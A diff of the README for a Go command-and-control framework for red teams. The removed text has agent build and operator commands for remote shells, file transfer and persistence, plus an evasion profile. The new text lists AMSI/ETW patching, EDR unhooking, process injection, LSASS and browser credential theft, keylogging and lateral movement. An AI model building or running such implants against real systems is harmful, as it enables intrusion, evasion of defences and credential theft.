@@ -1,306 +1,122 @@
-# taburtuaiC2
-
-A modular, OPSEC-minded Command & Control framework written in Go.  
-Built for authorized red team engagements only.
+# taburtuai C2
 
 > **Author:** mjopsec &nbsp;·&nbsp; **Version:** 2.0.0 &nbsp;·&nbsp; **License:** MIT
 
----
-
-## Features
-
-- **Two-phase encrypted comms** — AES-256-GCM static bootstrap key for initial checkin, then automatic ECDH P-256 ephemeral session key for all subsequent traffic (commands + results)
-- **SQLite persistence** — agents, commands, and staged payloads survive server restarts; command queue is durable
-- **Malleable C2 profiles** — YAML-driven beacon behavior baked into each payload at build time (Office365, CDN, jQuery, Slack, OCSP mimicry)
-- **Sleep obfuscation** — Windows `VirtualProtect` sleep masking (`PAGE_NOACCESS` during sleep) + RC4 key encryption via `SystemFunction032`
-- **Kill date & working hours** — agent self-terminates outside configured time windows
-- **Web dashboard** — Vue 3 SPA with Dashboard, Agents, Command History, Logs, Staged Payloads, and Team Server pages
-- **File operations** — upload / download with encrypted transfer
-- **Process management** — list, kill, start processes on the target
-- **Persistence** — registry run, scheduled task, service, WMI subscription (Windows + Linux + macOS)
-- **OPSEC modules** — AMSI/ETW patch, NTDLL unhooking, hardware breakpoints (HWBP via VEH), process hollowing, module stomping, map injection, thread hijacking, BOF/COFF loader
-- **Credential access** — LSASS dump, SAM dump (with VSS fallback), browser credentials (Chrome/Edge/Brave/Firefox), clipboard
-- **Network pivot** — in-process SOCKS5 proxy, network/ARP scan, registry R/W
-- **Alternative transports** — DNS-over-HTTPS, ICMP echo, SMB named pipe
-- **Cross-platform agent** — Windows / Linux / macOS (build-tagged platform code)
+A modular, OPSEC-minded Command & Control framework written in Go, built exclusively for authorized red team engagements and penetration testing exercises.
 
 ---
 
-## Project Structure
+## What It Is
 
-```
-taburtuaiC2/
-├── cmd/
-│   ├── server/            # Team server entry point
-│   └── operator/          # Operator CLI entry point
-├── internal/
-│   ├── api/               # HTTP handlers, middleware, routing (Gin)
-│   ├── config/            # Server configuration (env-based + CLI flags)
-│   ├── core/              # Server struct, SQLite-backed command queue
-│   ├── modules/           # Plugin module manager
-│   ├── services/          # Logger, agent monitor (write-through cache)
-│   └── storage/           # SQLite store (agents, commands)
-├── pkg/
-│   ├── crypto/            # AES-256-GCM + ECDH session key exchange
-│   └── types/             # Shared types (Command, AgentInfo, etc.)
-├── agent/
-│   ├── core/              # Agent beacon loop, checkin, command dispatch
-│   ├── evasion/           # Sleep masking (Windows VirtualProtect)
-│   └── persistence/       # Persistence mechanisms
-├── builder/
-│   ├── profiles/          # OPSEC profiles (default / stealth / aggressive)
-│   └── templates/         # Payload templates
-├── listener/
-│   └── http/              # HTTP listener
-├── web/
-│   ├── static/
-│   │   ├── css/           # variables · base · layout · components
-│   │   └── js/            # api · ui · app · pages (overview/agents/commands/logs)
-│   └── templates/         # dashboard.html shell
-├── scripts/build/         # build_agent.sh
-└── docs/                  # ROADMAP.md, ARCHITECTURE.md
-```
+Taburtuai C2 is a full-stack command and control framework — server, operator CLI, implant builder, and agent — designed around realistic adversary tradecraft. It prioritizes operational security at every layer: encrypted traffic that blends into normal web activity, agents that hide during sleep, and techniques that evade modern endpoint detection.
+
+The framework supports the full lifecycle of a red team engagement: initial access delivery, persistence, lateral movement, credential access, and exfiltration — all coordinated from a single team server with multi-operator support.
 
 ---
 
-## Quick Start
+## Core Capabilities
 
-### 1. Start the server
+**Infrastructure**
+- Team server with SQLite-backed durability — agents, commands, and results survive restarts
+- Multi-listener architecture: HTTP, HTTPS/TLS, WebSocket, DNS authoritative
+- Multi-operator support with agent claim/release and broadcast events
+- Vue 3 web dashboard for real-time monitoring
+- Two-phase encrypted comms: AES-256-GCM bootstrap → ECDH P-256 ephemeral session key
 
-```bash
-# Minimum — default port 8080
-ENCRYPTION_KEY=yourkey go run ./cmd/server
+**Implant & Evasion**
+- Sleep masking: `VirtualProtect(PAGE_NOACCESS)` + RC4 memory encryption during sleep
+- AMSI and ETW patching (in-process bypass without spawning child processes)
+- NTDLL unhooking: restore `.text` from clean disk copy, removing EDR hooks
+- Hardware breakpoint (HWBP) installation via Vectored Exception Handler
+- Anti-debug, anti-VM, and anti-sandbox checks
+- Hell's Gate indirect syscall (PEB walk + SSN resolution + `syscall;ret` gadget)
+- Malleable C2 HTTP profiles: Office365, CDN, jQuery, Slack, OCSP traffic mimicry
 
-# Custom port + host
-ENCRYPTION_KEY=yourkey go run ./cmd/server --port 9000 --host 0.0.0.0
+**Post-Exploitation**
+- Process injection: CRT, APC, hollowing, thread hijacking, module stomping, section mapping
+- PPID spoofing: spawn processes under a chosen parent PID
+- Credential access: LSASS dump, SAM hive, browser passwords, clipboard
+- Lateral movement: WMI, WinRM, DCOM, scheduled tasks, Windows services
+- Token manipulation: steal/impersonate/make tokens, RunAs under alternate identity
+- Alternate Data Streams: write, read, execute payloads from NTFS ADS
+- BOF/COFF loader: execute Beacon Object Files in-memory
+- Network pivot: in-process SOCKS5 proxy, port forwarding, TCP scan, ARP scan
+- Registry: read, write, delete, enumerate keys and values
+- Reconnaissance: desktop screenshot, keylogger, process listing
+- Persistence: registry Run, scheduled tasks, services, WMI subscriptions, startup folder
 
-# With auth enabled
-ENCRYPTION_KEY=yourkey API_KEY=mytoken go run ./cmd/server --port 9000 --auth
-```
-
-The web dashboard is available at `http://<host>:<port>/`.
+**Payload Builder**
+- Cross-platform targets: Windows (primary), Linux, macOS
+- Output formats: EXE, DLL, ELF, shellcode, PowerShell script
+- OPSEC profiles baked at compile time: `default`, `stealth`, `aggressive`, `opsec`, `paranoid`
+- PE masquerade: version resource and company/product metadata spoofing
+- Optional Garble-based code obfuscation and binary compression
+- Alternative transports: DNS-over-HTTPS, ICMP echo, SMB named pipe
 
 ---
 
-### 2. Operator CLI
+## Architecture Overview
 
-The CLI connects to a running server. The `--server` flag (or `TABURTUAI_SERVER` env var) must point to your server.
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000
 ```
-
-> **Note:** use `http://` (not `https://`) unless you have TLS configured on the server.
-
-#### List agents
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 agents list
-```
-
-#### Execute a command on an agent
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 \
-  cmd execute <agent-id> "whoami"
-```
-
-#### Interactive shell
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 \
-  shell <agent-id>
-```
-
-#### File upload / download
-
-```bash
-# Upload local file to agent
-go run ./cmd/operator --server http://172.23.0.118:9000 \
-  files upload <agent-id> /local/file.txt /remote/path/file.txt
-
-# Download file from agent
-go run ./cmd/operator --server http://172.23.0.118:9000 \
-  files download <agent-id> /remote/path/file.txt
-```
-
-#### Process management
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 process list <agent-id>
-go run ./cmd/operator --server http://172.23.0.118:9000 process kill <agent-id> <pid>
-```
-
-#### Persistence
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 \
-  persistence setup <agent-id> --method registry
-```
-
-#### Server stats & logs
-
-```bash
-go run ./cmd/operator --server http://172.23.0.118:9000 stats
-go run ./cmd/operator --server http://172.23.0.118:9000 logs
-```
-
-#### Build a pre-compiled operator binary (optional)
-
-```bash
-go build -o bin/operator ./cmd/operator
-./bin/operator --server http://172.23.0.118:9000 agents list
+Operator CLI ──────────────────────────────────────────────┐
+Web Dashboard ──────────────────┐                          │
+                                ▼                          ▼
+                         ┌─────────────────────────────────────┐
+                         │           Team Server               │
+                         │  ┌──────────┐  ┌────────────────┐   │
+                         │  │ REST API │  │  SQLite Queue  │   │
+                         │  └──────────┘  └────────────────┘   │
+                         │  ┌──────────┐  ┌────────────────┐   │
+                         │  │ Profiles │  │  Team Server   │   │
+                         │  └──────────┘  └────────────────┘   │
+                         └─────────────────────────────────────┘
+                                         │
+                              Encrypted Beacon
+                              (AES-256-GCM)
+                                         │
+                         ┌───────────────▼─────────────────────┐
+                         │               Agent                  │
+                         │  ┌──────────────────────────────┐    │
+                         │  │  Beacon Loop (configurable)  │    │
+                         │  │  Sleep Mask  │  Evasion      │    │
+                         │  │  60+ commands dispatched     │    │
+                         │  └──────────────────────────────┘    │
+                         └─────────────────────────────────────┘
 ```
 
 ---
 
-### 3. Build an agent
+## Documentation
 
-**Key rules:**
-- `--key` must match the server's `ENCRYPTION_KEY` — it is the **AES-256-GCM encryption key** for all agent↔server communications, not an auth token.
-- `--server` must be reachable from the target machine.
+Full operator documentation is available in the [wiki](wiki/Home.md):
 
-```bash
-# Basic Linux agent
-bash scripts/build/build_agent.sh \
-  --server http://172.23.0.118:9000 \
-  --key yourkey \
-  --os linux --arch amd64
-
-# Windows stealth agent (debug build first — no -S flag, console visible)
-bash scripts/build/build_agent.sh \
-  --server http://172.23.0.118:9000 \
-  --key yourkey \
-  --os windows --arch amd64 \
-  --debug
-
-# Windows production build with stealth OPSEC profile
-bash scripts/build/build_agent.sh \
-  --server http://172.23.0.118:9000 \
-  --key yourkey \
-  --os windows --arch amd64 \
-  --profile builder/profiles/stealth.yaml \
-  --stealth --compress
-```
-
----
-
-## Configuration
-
-### Server — environment variables & CLI flags
-
-Environment variables are the base; CLI flags override them.
-
-| Variable / Flag              | Default                   | Description                                          |
-|------------------------------|---------------------------|------------------------------------------------------|
-| `PORT` / `--port`            | `8080`                    | Listening port                                       |
-| `HOST` / `--host`            | `0.0.0.0`                 | Bind address                                         |
-| `ENCRYPTION_KEY`             | *(required)*              | AES-256 encryption key — **must match agent build**  |
-| `SECONDARY_KEY`              | *(optional)*              | Secondary AES-256 key                                |
-| `AUTH_ENABLED` / `--auth`    | `false`                   | Require API key on all operator requests             |
-| `API_KEY` / `--api-key`      | *(required if auth on)*   | Bearer token for operators                           |
-| `LOG_DIR` / `--log-dir`      | `./logs`                  | Log output directory                                 |
-| `LOG_LEVEL` / `--log-level`  | `INFO`                    | `DEBUG` / `INFO` / `WARN` / `ERROR`                  |
-| `DB_PATH` / `--db`           | `./data/taburtuai.db`     | SQLite database path                                 |
-| `AGENT_DORMANT_SEC`          | `600`                     | Seconds without beacon before agent → dormant        |
-| `AGENT_OFFLINE_SEC`          | `1800`                    | Seconds without beacon before agent → offline        |
-
-### Agent status
-
-| Status    | Meaning                                                              |
-|-----------|----------------------------------------------------------------------|
-| `online`  | Beaconed within `AGENT_DORMANT_SEC` (default 10 min)                |
-| `dormant` | No beacon for 10–30 min — **commands can still be queued**; agent picks them up on next wake |
-| `offline` | No beacon for > `AGENT_OFFLINE_SEC` (default 30 min) — commands rejected |
-
-> **Tip:** When using slow-beacon profiles (e.g. stealth = 300 s interval), lower `AGENT_DORMANT_SEC` to match or just leave it — dormant agents still receive queued commands on their next checkin.
-
----
-
-## OPSEC Profiles
-
-Profiles are YAML files in `builder/profiles/` baked into the agent at compile time via `-ldflags`.
-
-| Profile      | Interval | Jitter | Working Hours | Sleep Masking | Evasion |
-|--------------|----------|--------|---------------|---------------|---------|
-| `default`    | 30 s     | 30 %   | off           | off           | off     |
-| `stealth`    | 300 s    | 50 %   | 08:00–18:00   | on            | on      |
-| `aggressive` | 10 s     | 10 %   | off           | off           | off     |
-
-> **Warning:** `stealth.yaml` enables `working_hours_only: true`. The agent **will not beacon outside 08:00–18:00 local time** on the target machine. For testing, use `default` profile or build without `--profile`.
-
-Profile fields:
-
-```yaml
-name: stealth
-sleep_interval: 300s      # beacon interval
-jitter_percent: 50        # ± jitter on interval
-max_retries: 3
-kill_date: ""             # YYYY-MM-DD; empty = never
-working_hours_only: true  # only beacon during working hours
-working_hours_start: 8    # 24h
-working_hours_end: 18
-sleep_masking: true       # Windows VirtualProtect during sleep
-user_agent_rotation: true
-enable_sandbox_check: true
-enable_vm_check: true
-enable_debug_check: true
-```
-
----
-
-## API Reference
-
-All endpoints are under `/api/v1`.
-
-| Method | Path                              | Description                     |
-|--------|-----------------------------------|---------------------------------|
-| POST   | `/checkin`                        | Agent check-in (ECDH handshake) |
-| GET    | `/agents`                         | List all agents                 |
-| GET    | `/agents/:id`                     | Get agent details               |
-| DELETE | `/agents/:id`                     | Remove agent                    |
-| POST   | `/command`                        | Queue a command                 |
-| GET    | `/command/:id/next`               | Agent polls next command        |
-| POST   | `/command/result`                 | Agent submits result            |
-| GET    | `/command/:id/status`             | Check command status            |
-| GET    | `/agent/:id/commands`             | Command history                 |
-| DELETE | `/agent/:id/queue`                | Clear pending queue             |
-| POST   | `/agent/:id/upload`               | Upload file to agent            |
-| POST   | `/agent/:id/download`             | Download file from agent        |
-| POST   | `/agent/:id/process/list`         | List processes                  |
-| POST   | `/agent/:id/process/kill`         | Kill process                    |
-| POST   | `/agent/:id/process/start`        | Start process                   |
-| POST   | `/agent/:id/persistence/setup`    | Install persistence             |
-| POST   | `/agent/:id/persistence/remove`   | Remove persistence              |
-| GET    | `/health`                         | Server health check             |
-| GET    | `/stats`                          | Server statistics               |
-| GET    | `/logs`                           | Fetch server logs               |
-| GET    | `/queue/stats`                    | Queue statistics                |
-
----
-
-## Development Phases
-
-| Phase | Status         | Focus                                                                          |
-|-------|----------------|--------------------------------------------------------------------------------|
-| 1     | ✅ Done        | API skeleton, agent beacon loop, logging, auth (API key)                       |
-| 2     | ✅ Done        | File ops, process management, persistence (registry, schtask, service, WMI)   |
-| 3     | ✅ Done        | SQLite persistence, ECDH P-256 session keys, sleep masking, OPSEC profiles     |
-| 4     | ✅ Done        | Web dashboard — Vue 3 SPA (agents, commands, logs, staged payloads, team)      |
-| 5     | ✅ Done        | Injection suite — hollow, stomp, mapinject, hijack, APC, BOF/COFF loader       |
-| 6     | ✅ Done        | Credential access — LSASS/SAM dump, browser creds (Chrome/Edge/Firefox), clip  |
-| 7     | ✅ Done        | OPSEC — AMSI/ETW patch, NTDLL unhook, HWBP/VEH, anti-debug/VM/sandbox         |
-| 8     | ✅ Done        | Network pivot — SOCKS5 proxy, ARP/net scan, registry R/W                       |
-| 9     | ✅ Done        | Alternative transports — DNS-over-HTTPS, ICMP echo, SMB named pipe             |
-| 10    | ✅ Done        | Team server — multi-operator sessions, agent claim/release, broadcast events   |
-| 11    | 🔲 Planned     | Listeners — HTTPS/TLS termination, WebSocket, DNS authoritative                |
-| 12    | 🔲 Planned     | P2P relay — peer agent chaining, port-forward, reverse tunnel                  |
-
-See [docs/ROADMAP.md](docs/ROADMAP.md) for detailed task breakdowns.
+| Page | Description |
+|------|-------------|
+| [Quick Start](wiki/01-quick-start.md) | Get the server, CLI, and first agent running in minutes |
+| [Architecture](wiki/02-architecture.md) | How components fit together and how traffic flows |
+| [Configuration](wiki/03-configuration.md) | Server and agent configuration reference |
+| [Building Payloads](wiki/04-building-payloads.md) | Generate command: stager, stageless, formats, profiles |
+| [Operator Console](wiki/05-operator-console.md) | Interactive console usage and all available commands |
+| [Agent Management](wiki/06-agent-management.md) | List, inspect, and manage connected agents |
+| [Command Execution](wiki/07-command-execution.md) | shell, cmd, status, history — with output examples |
+| [File Operations](wiki/08-file-operations.md) | Upload and download files through the encrypted channel |
+| [Process Management](wiki/09-process-management.md) | List, kill, and start processes on the target |
+| [Persistence](wiki/10-persistence.md) | Registry, scheduled tasks, services, WMI — all methods |
+| [Code Injection](wiki/11-code-injection.md) | All 6 injection methods with OPSEC comparison |
+| [Evasion](wiki/12-evasion.md) | AMSI, ETW, HWBP, sleep masking, NTDLL unhook |
+| [Credential Access](wiki/13-credential-access.md) | LSASS, SAM, browser passwords, clipboard |
+| [Reconnaissance](wiki/14-reconnaissance.md) | Screenshot, keylogger, network and ARP scan |
+| [Token Manipulation](wiki/15-token-manipulation.md) | Token steal, impersonate, make_token, RunAs |
+| [Lateral Movement](wiki/16-lateral-movement.md) | WMI, WinRM, DCOM, schtask, service |
+| [Network Pivot](wiki/17-network-pivot.md) | SOCKS5 proxy, port forwarding, registry |
+| [C2 Profiles](wiki/18-c2-profiles.md) | Malleable HTTP profiles and OPSEC profiles |
+| [OPSEC Guide](wiki/19-opsec-guide.md) | Operational security practices for engagements |
+| [Engagement Scenarios](wiki/20-engagement-scenarios.md) | Full attack chain examples end to end |
 
 ---
 
 ## Legal
 
-This tool is provided for **authorized penetration testing and red team engagements only**.  
-Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.
+This tool is provided solely for **authorized penetration testing, red team engagements, and security research**.  
+Use against systems you do not own or lack explicit written permission to test is illegal and unethical.  
+The author assumes no liability for misuse.
